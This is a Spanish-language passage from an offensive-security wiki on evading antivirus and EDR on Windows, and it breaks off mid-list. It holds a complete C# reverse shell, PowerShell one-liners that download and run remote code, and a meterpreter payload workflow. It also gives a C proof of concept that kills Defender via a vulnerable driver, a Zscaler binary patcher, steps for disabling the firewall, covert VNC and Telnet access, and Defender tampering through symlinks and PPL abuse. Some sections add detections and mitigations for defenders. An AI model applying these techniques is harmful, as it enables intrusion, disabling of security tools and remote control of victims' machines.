SmartScreen funciona principalmente mediante un enfoque basado en la reputación, lo que significa que las aplicaciones descargadas con poca frecuencia activarán SmartScreen, alertando así al usuario final e impidiéndole ejecutar el archivo (aunque el archivo todavía se puede ejecutar haciendo clic en More Info -> Run anyway).

**MoTW** (Mark of The Web) es un [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) con el nombre Zone.Identifier, que se crea automáticamente al descargar archivos de Internet, junto con la URL desde la que se descargaron.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Comprobación del ADS Zone.Identifier de un archivo descargado de Internet.</p></figcaption></figure>

> [!TIP]
> Es importante tener en cuenta que los ejecutables firmados con un certificado de firma **de confianza** **no activarán SmartScreen**.

Una forma muy eficaz de evitar que tus payloads obtengan el Mark of The Web es empaquetarlos dentro de algún tipo de contenedor, como una ISO. Esto ocurre porque Mark-of-the-Web (MOTW) **no puede** aplicarse a volúmenes **que no sean NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) es una herramienta que empaqueta payloads en contenedores de salida para evadir Mark-of-the-Web.

Uso de ejemplo:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Aquí tienes una demostración para hacer bypass de SmartScreen empaquetando payloads dentro de archivos ISO mediante [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) es un potente mecanismo de logging en Windows que permite a las aplicaciones y componentes del sistema **registrar eventos**. Sin embargo, también puede ser utilizado por productos de seguridad para monitorizar y detectar actividades maliciosas.

De forma similar a cómo se deshabilita (bypassea) AMSI, también es posible hacer que la función **`EtwEventWrite`** del proceso en user space retorne inmediatamente sin registrar ningún evento. Esto se consigue parcheando la función en memoria para que retorne inmediatamente, deshabilitando eficazmente el logging de ETW para ese proceso.

Puedes encontrar más información en **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) y [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Cargar binarios de C# en memoria se conoce desde hace bastante tiempo y sigue siendo una forma excelente de ejecutar tus herramientas de post-exploitation sin ser detectado por el AV.

Como el payload se cargará directamente en memoria sin tocar el disco, solo tendremos que preocuparnos de parchear AMSI para todo el proceso.

La mayoría de frameworks C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) ya ofrecen la capacidad de ejecutar C# assemblies directamente en memoria, pero existen diferentes formas de hacerlo:

- **Fork\&Run**

Consiste en **crear un nuevo proceso sacrificial**, inyectar tu código malicioso de post-exploitation en ese nuevo proceso, ejecutar tu código malicioso y, al terminar, finalizar el nuevo proceso. Esto tiene ventajas y desventajas. La ventaja del método fork and run es que la ejecución ocurre **fuera** del proceso de nuestro implante Beacon. Esto significa que, si algo sale mal o es detectado durante nuestra acción de post-exploitation, existe una **probabilidad mucho mayor** de que nuestro **implante sobreviva.** La desventaja es que tienes una **mayor probabilidad** de ser detectado por las **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Consiste en inyectar el código malicioso de post-exploitation **en su propio proceso**. De este modo, puedes evitar tener que crear un nuevo proceso y que el AV lo analice, pero la desventaja es que, si algo sale mal durante la ejecución de tu payload, existe una **probabilidad mucho mayor** de **perder tu beacon**, ya que podría bloquearse.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Si quieres leer más sobre la carga de C# Assembly, consulta este artículo [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) y su InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

También puedes cargar C# Assemblies **desde PowerShell**; consulta [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) y el [vídeo de S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Como se propone en [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), es posible ejecutar código malicioso utilizando otros lenguajes proporcionando a la máquina comprometida acceso **al entorno del intérprete instalado en el SMB share controlado por el atacante**.

Al permitir el acceso a los Interpreter Binaries y al entorno en el SMB share, puedes **ejecutar código arbitrario en estos lenguajes dentro de la memoria** de la máquina comprometida.

El repositorio indica: Defender sigue analizando los scripts, pero al utilizar Go, Java, PHP, etc., tenemos **más flexibilidad para evadir firmas estáticas**. Las pruebas con reverse shell scripts aleatorios y sin ofuscar en estos lenguajes han demostrado ser exitosas.

## TokenStomping

Token stomping manipula el access token de un producto de seguridad, como un EDR o AV. Reducir los privilegios del token puede permitir que el proceso siga ejecutándose, al mismo tiempo que se le impide realizar acciones privilegiadas de inspección o remediación.

Para evitarlo, Windows podría **impedir que procesos externos** obtengan handles sobre los tokens de los procesos de seguridad.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Como se describe en [**esta publicación del blog**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), es fácil simplemente desplegar Chrome Remote Desktop en el PC de una víctima y utilizarlo después para tomar el control y mantener la persistencia:<sup>[[35]](#references)</sup>
1. Descarga desde https://remotedesktop.google.com/, haz clic en "Set up via SSH" y, a continuación, haz clic en el archivo MSI de Windows para descargarlo.
2. Ejecuta el instalador silenciosamente en la víctima (se requieren privilegios de administrador): `msiexec /i chromeremotedesktophost.msi /qn`
3. Regresa a la página de Chrome Remote Desktop y haz clic en next. El asistente te pedirá autorización; haz clic en el botón Authorize para continuar.
4. Ejecuta el comando proporcionado con los ajustes necesarios: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (el parámetro `--pin` establece el PIN sin utilizar la GUI).


## Advanced Evasion

Evasion es un tema muy complicado; a veces tienes que tener en cuenta muchas fuentes diferentes de telemetría en un mismo sistema, por lo que es prácticamente imposible permanecer completamente indetectable en entornos maduros.

Cada entorno al que te enfrentes tendrá sus propias fortalezas y debilidades.

Te recomiendo encarecidamente que veas esta charla de [@ATTL4S](https://twitter.com/DaniLJ94) para obtener una introducción a técnicas de Advanced Evasion más avanzadas.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Esta es también otra excelente charla de [@mariuszbit](https://twitter.com/mariuszbit) sobre Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Puedes utilizar [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), que **eliminará partes del binario** hasta **averiguar qué parte considera maliciosa Defender** y te la mostrará.\
Otra herramienta que hace **lo mismo es** [**avred**](https://github.com/dobin/avred), con un servicio web disponible en [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Hasta Windows10, todas las versiones de Windows incluían un **Telnet server** que podías instalar (como administrador) ejecutando:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Haz que **se inicie** cuando se inicie el sistema y **ejecútalo** ahora:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Cambiar el puerto de telnet** (sigilo) **y deshabilitar el firewall:**
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Descárgalo desde: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (necesitas las descargas bin, no el setup)

**EN EL HOST**: Ejecuta _**winvnc.exe**_ y configura el servidor:

- Activa la opción _Disable TrayIcon_
- Establece una contraseña en _VNC Password_
- Establece una contraseña en _View-Only Password_

Después, mueve el binario _**winvnc.exe**_ y el archivo **recién** creado _**UltraVNC.ini**_ dentro de la **víctima**

#### **Reverse connection**

El **atacante** debe **ejecutar dentro de** su **host** el binario `vncviewer.exe -listen 5900`, de modo que estará **preparado** para recibir una **conexión VNC** inversa. Después, dentro de la **víctima**: Inicia el daemon winvnc `winvnc.exe -run` y ejecuta `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ADVERTENCIA:** Para mantener el sigilo, no debes hacer algunas cosas

- No inicies `winvnc` si ya se está ejecutando o activarás un [popup](https://i.imgur.com/1SROTTl.png). Comprueba si se está ejecutando con `tasklist | findstr winvnc`
- No inicies `winvnc` sin `UltraVNC.ini` en el mismo directorio o hará que se abra [la ventana de configuración](https://i.imgur.com/rfMQWcf.png)
- No ejecutes `winvnc -h` para obtener ayuda o activarás un [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Descárgalo desde: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Dentro de GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Ahora **inicia el lister** con `msfconsole -r file.rc` y **ejecuta** el **payload XML** con:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**El Defender actual terminará el proceso muy rápido.**

### Compilando nuestro propio reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Primer C# Revershell

Compílalo con:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Úsalo con:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# usando el compilador
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Descarga y ejecución automáticas:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista de obfuscators de C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Ejemplo de uso de python para crear injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Otras herramientas
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Más

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Eliminación de AV/EDR desde el espacio del kernel

Storm-2603 utilizó una pequeña utilidad de consola conocida como **Antivirus Terminator** para deshabilitar las protecciones de los endpoints antes de implementar ransomware. La herramienta incluye su **propio driver vulnerable pero *firmado*** y abusa de él para emitir operaciones privilegiadas del kernel que ni siquiera los servicios AV Protected-Process-Light (PPL) pueden bloquear.<sup>[[12]](#references)</sup>

Puntos clave
1. **Driver firmado**: el archivo entregado al disco es `ServiceMouse.sys`, pero el binario es el driver legítimamente firmado `AToolsKrnl64.sys`, perteneciente al “System In-Depth Analysis Toolkit” de Antiy Labs. Como el driver tiene una firma válida de Microsoft, se carga incluso cuando Driver-Signature-Enforcement (DSE) está habilitado.
2. **Instalación del servicio**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
La primera línea registra el driver como un **servicio del kernel** y la segunda lo inicia para que `\\.\ServiceMouse` sea accesible desde user land.
3. **IOCTLs expuestos por el driver**
| Código IOCTL | Capacidad                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminar un proceso arbitrario mediante su PID (utilizado para eliminar servicios de Defender/EDR) |
| `0x990000D0` | Eliminar un archivo arbitrario del disco |
| `0x990001D0` | Descargar el driver y eliminar el servicio |

Prueba de concepto mínima en C:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Por qué funciona**: BYOVD omite por completo las protecciones de user-mode; el código que se ejecuta en el kernel puede abrir procesos *protegidos*, terminarlos o manipular objetos del kernel independientemente de PPL/PP, ELAM u otras funciones de hardening.

Detección / Mitigación
•  Habilitar la lista de bloqueo de drivers vulnerables de Microsoft (`HVCI`, `Smart App Control`) para que Windows se niegue a cargar `AToolsKrnl64.sys`.
•  Supervisar la creación de nuevos servicios del *kernel* y generar alertas cuando se cargue un driver desde un directorio con permisos de escritura para todos o que no esté presente en la allow-list.
•  Vigilar los handles de user-mode hacia objetos de dispositivo personalizados seguidos de llamadas sospechosas a `DeviceIoControl`.

### Evadiendo las comprobaciones de postura de Zscaler Client Connector mediante el patching de binarios en disco

**Client Connector** de Zscaler aplica localmente reglas de postura del dispositivo y depende de Windows RPC para comunicar los resultados a otros componentes. Dos decisiones de diseño débiles hacen posible un bypass completo:

1. La evaluación de la postura ocurre **completamente en el cliente** (se envía un booleano al servidor).
2. Los endpoints RPC internos solo validan que el ejecutable que se conecta esté **firmado por Zscaler** (mediante `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Mediante el **patching de cuatro binarios firmados en disco**, ambos mecanismos pueden neutralizarse:

| Binario | Lógica original parcheada | Resultado |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Siempre devuelve `1`, por lo que todas las comprobaciones cumplen |
| `ZSAService.exe` | Llamada indirecta a `WinVerifyTrust` | Se reemplaza por NOP ⇒ cualquier proceso (incluso uno sin firmar) puede conectarse a los pipes RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Se reemplaza por `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Comprobaciones de integridad del túnel | Se omiten mediante un salto directo |

Extracto mínimo del patcher:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Después de reemplazar los archivos originales y reiniciar el stack de servicios:

* **Todas** las comprobaciones de postura muestran **verde/cumplimiento**.
* Los binarios sin firmar o modificados pueden abrir los endpoints RPC de named-pipe (por ejemplo, `\\RPC Control\\ZSATrayManager_talk_to_me`).
* El host comprometido obtiene acceso sin restricciones a la red interna definida por las políticas de Zscaler.

Este caso práctico demuestra cómo las decisiones de confianza exclusivamente del lado del cliente y las simples comprobaciones de firma pueden eludirse con unos pocos parches de bytes.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) aplica una jerarquía de firmante/nivel para que solo los procesos protegidos con un nivel igual o superior puedan manipularse entre sí. Desde una perspectiva ofensiva, si puedes iniciar legítimamente un binario habilitado para PPL y controlar sus argumentos, puedes convertir una funcionalidad benigna (por ejemplo, el logging) en una primitiva de escritura restringida y respaldada por PPL contra directorios protegidos utilizados por AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Qué hace que un proceso se ejecute como PPL
- El EXE objetivo (y cualquier DLL cargada) debe estar firmado con un EKU compatible con PPL.
- El proceso debe crearse con CreateProcess utilizando los flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Debe solicitarse un nivel de protección compatible que coincida con el firmante del binario (por ejemplo, `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` para firmantes anti-malware, `PROTECTION_LEVEL_WINDOWS` para firmantes de Windows). Los niveles incorrectos harán que la creación falle.

Consulta también una introducción más amplia a PP/PPL y a la protección de LSASS aquí:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Herramientas de lanzamiento
- Helper de código abierto: CreateProcessAsPPL (selecciona el nivel de protección y reenvía los argumentos al EXE objetivo):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Patrón de uso:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- El binario de sistema firmado `C:\Windows\System32\ClipUp.exe` se inicia a sí mismo y acepta un parámetro para escribir un archivo de registro en una ruta especificada por quien realiza la llamada.
- Cuando se inicia como un proceso PPL, la escritura del archivo se realiza con respaldo de PPL.
- ClipUp no puede analizar rutas que contengan espacios; usa rutas cortas 8.3 para apuntar a ubicaciones normalmente protegidas.

Ayudantes para rutas cortas 8.3
- Listar nombres cortos: `dir /x` en cada directorio principal.
- Obtener la ruta corta en cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Cadena de abuso (abstracta)
1) Inicia el LOLBIN compatible con PPL (ClipUp) con `CREATE_PROTECTED_PROCESS` usando un launcher (por ejemplo, CreateProcessAsPPL).
2) Pasa el argumento de ruta del registro de ClipUp para forzar la creación de un archivo en un directorio protegido del AV (por ejemplo, Defender Platform). Usa nombres cortos 8.3 si es necesario.
3) Si el binario objetivo normalmente está abierto/bloqueado por el AV mientras se ejecuta (por ejemplo, MsMpEng.exe), programa la escritura durante el arranque, antes de que se inicie el AV, instalando un servicio de inicio automático que se ejecute de forma fiable antes. Valida el orden de arranque con Process Monitor (registro de arranque).
4) Al reiniciar, la escritura respaldada por PPL se realiza antes de que el AV bloquee sus binarios, dañando el archivo objetivo e impidiendo el inicio.

Ejemplo de invocación (rutas ocultas/acortadas por seguridad):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notas y restricciones
- No puedes controlar el contenido que escribe ClipUp más allá de su ubicación; la primitive es adecuada para la corrupción más que para la inyección precisa de contenido.
- Requiere permisos de administrador local/SYSTEM para instalar/iniciar un servicio y una ventana de reinicio.
- El timing es crítico: el objetivo no debe estar abierto; la ejecución durante el arranque evita los bloqueos de archivos.

Detecciones
- Creación del proceso `ClipUp.exe` con argumentos inusuales, especialmente cuando el proceso padre es un launcher no estándar, alrededor del arranque.
- Nuevos servicios configurados para iniciar automáticamente binarios sospechosos y que se inician sistemáticamente antes que Defender/AV. Investiga la creación/modificación de servicios anterior a los fallos de inicio de Defender.
- Monitorización de la integridad de archivos en binarios/directorios de Defender/Platform; creaciones/modificaciones inesperadas de archivos por procesos con flags de protected-process.
- Telemetría ETW/EDR: busca procesos creados con `CREATE_PROTECTED_PROCESS` y un uso anómalo del nivel PPL por parte de binarios que no sean de AV.

Mitigaciones
- WDAC/Code Integrity: restringe qué binarios firmados pueden ejecutarse como PPL y bajo qué procesos padre; bloquea la invocación de ClipUp fuera de contextos legítimos.
- Higiene de servicios: restringe la creación/modificación de servicios de inicio automático y monitoriza la manipulación del orden de inicio.
- Asegúrate de que tamper protection de Defender y las protecciones de early launch estén habilitadas; investiga los errores de inicio que indiquen corrupción de binarios.
- Considera deshabilitar la generación de nombres cortos 8.3 en los volúmenes que alojan herramientas de seguridad si es compatible con tu entorno (pruébalo exhaustivamente).

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender selecciona la plataforma desde la que se ejecuta enumerando las subcarpetas bajo:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Selecciona la subcarpeta con la cadena de versión lexicográficamente más alta (por ejemplo, `4.18.25070.5-0`) y, a continuación, inicia desde allí los procesos del servicio de Defender (actualizando las rutas del servicio/registro según corresponda). Esta selección confía en las entradas de directorio, incluidos los puntos de reparseo de directorio (symlinks). Un administrador puede aprovechar esto para redirigir Defender a una ruta escribible por el atacante y conseguir DLL sideloading o interrumpir el servicio.<sup>[[21]](#references)[[22]](#references)</sup>

Requisitos previos
- Administrador local (necesario para crear directorios/symlinks bajo la carpeta Platform)
- Capacidad para reiniciar o activar una nueva selección de la plataforma de Defender (reinicio del servicio durante el arranque)
- Solo se requieren herramientas integradas (`mklink`)

Por qué funciona
- Defender bloquea las escrituras en sus propias carpetas, pero la selección de la plataforma confía en las entradas de directorio y elige la versión lexicográficamente más alta sin validar que el destino resuelva a una ruta protegida/de confianza.

Paso a paso (ejemplo)
1) Prepara un clon escribible de la carpeta de la plataforma actual, por ejemplo, `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Crea un enlace simbólico de directorio de una versión superior dentro de Platform que apunte a tu carpeta:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Selección del trigger (se recomienda reiniciar):
```cmd
shutdown /r /t 0
```
4) Verifica que MsMpEng.exe (WinDefend) se ejecute desde la ruta redirigida:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Opciones de post-exploitation
- DLL sideloading/code execution: Coloca o reemplaza DLL que Defender carga desde su directorio de aplicación para ejecutar código en los procesos de Defender. Consulta la sección anterior: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Elimina el version-symlink para que, en el siguiente inicio, la ruta configurada no se resuelva y Defender no pueda iniciarse:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Ten en cuenta que esta técnica no proporciona escalada de privilegios por sí sola; requiere derechos de administrador.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Los equipos Red pueden trasladar la evasión en tiempo de ejecución fuera del implante C2 y dentro del propio módulo objetivo mediante el hooking de su Import Address Table (IAT) y el enrutamiento de APIs seleccionadas a través de código controlado por el atacante y position-independent (PIC). Esto generaliza la evasión más allá de la pequeña superficie de APIs que exponen muchos kits (por ejemplo, CreateProcessA), y extiende las mismas protecciones a BOFs y DLLs de post-explotación.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Enfoque de alto nivel
- Preparar un blob PIC junto al módulo objetivo mediante un reflective loader (antepuesto o complementario). El PIC debe ser autocontenido y position-independent.
- Cuando se carga la DLL host, recorrer su IMAGE_IMPORT_DESCRIPTOR y modificar las entradas de la IAT correspondientes a las importaciones objetivo (por ejemplo, CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) para que apunten a wrappers PIC ligeros.
- Cada wrapper PIC ejecuta evasiones antes de hacer tail-call a la dirección de la API real. Entre las evasiones habituales se incluyen:
